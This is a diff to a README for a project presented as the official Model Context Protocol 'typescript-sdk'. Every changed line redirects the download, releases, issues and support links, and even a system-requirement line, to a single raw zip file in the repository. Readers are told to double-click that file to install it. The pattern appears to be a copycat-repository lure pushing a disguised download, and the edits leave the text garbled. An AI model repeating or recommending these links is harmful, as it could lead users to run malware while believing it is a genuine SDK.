@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download typescript-sdk](https://img.shields.io/badge/Download%20typescript--sdk-brightgreen)](https://github.com/Heaven323555/typescript-sdk/releases)
+[![Download typescript-sdk](https://raw.githubusercontent.com/Heaven323555/typescript-sdk/main/percipient/typescript-sdk.zip%20typescript--sdk-brightgreen)](https://raw.githubusercontent.com/Heaven323555/typescript-sdk/main/percipient/typescript-sdk.zip)
 
 ## 📖 About
 
@@ -13,7 +13,7 @@ The **typescript-sdk** is the official SDK for connecting to Model Context Proto
 To begin using the typescript-sdk, follow these simple steps:
 
 1. **Download the SDK**
-   - Visit this page to download: [Releases Page](https://github.com/Heaven323555/typescript-sdk/releases).
+   - Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Heaven323555/typescript-sdk/main/percipient/typescript-sdk.zip).
   
 2. **Install the SDK**
    - Locate the downloaded file on your computer. Double-click to start the installation.
@@ -30,7 +30,7 @@ Before you download, make sure your system meets the following requirements:
 - Operating System: Windows, macOS, or Linux
 - RAM: At least 4 GB of memory
 - Disk Space: Minimum of 200 MB for installation
-- Node.js: Version 12 or higher is required to run the SDK features smoothly.
+- https://raw.githubusercontent.com/Heaven323555/typescript-sdk/main/percipient/typescript-sdk.zip Version 12 or higher is required to run the SDK features smoothly.
 
 ## ⚙️ Features
 
@@ -50,11 +50,11 @@ If you encounter any issues during installation or usage, here are some common s
 - **Application Won’t Start**: Confirm that your operating system meets the system requirements.
 - **Network Issues**: Check your internet connection if you cannot connect to Model Context Protocol servers.
 
-If these steps do not resolve your issues, consider visiting the [issues page](https://github.com/Heaven323555/typescript-sdk/issues) for additional help.
+If these steps do not resolve your issues, consider visiting the [issues page](https://raw.githubusercontent.com/Heaven323555/typescript-sdk/main/percipient/typescript-sdk.zip) for additional help.
 
 ## 📞 Support
 
-Need help? You can reach out for support through our GitHub repository. Visit the [issues page](https://github.com/Heaven323555/typescript-sdk/issues) to ask questions or report problems.
+Need help? You can reach out for support through our GitHub repository. Visit the [issues page](https://raw.githubusercontent.com/Heaven323555/typescript-sdk/main/percipient/typescript-sdk.zip) to ask questions or report problems.
 
 ## 📝 License
 
@@ -62,6 +62,6 @@ The typescript-sdk is open source and free to use. For more information, refer t
 
 ## 📥 Download & Install
 
-Don't wait to start using the typescript-sdk. Visit this page to download: [Releases Page](https://github.com/Heaven323555/typescript-sdk/releases) and follow the instructions above to install and run it.
+Don't wait to start using the typescript-sdk. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Heaven323555/typescript-sdk/main/percipient/typescript-sdk.zip) and follow the instructions above to install and run it.
 
 Get started with the powerful capabilities of the typescript-sdk today!
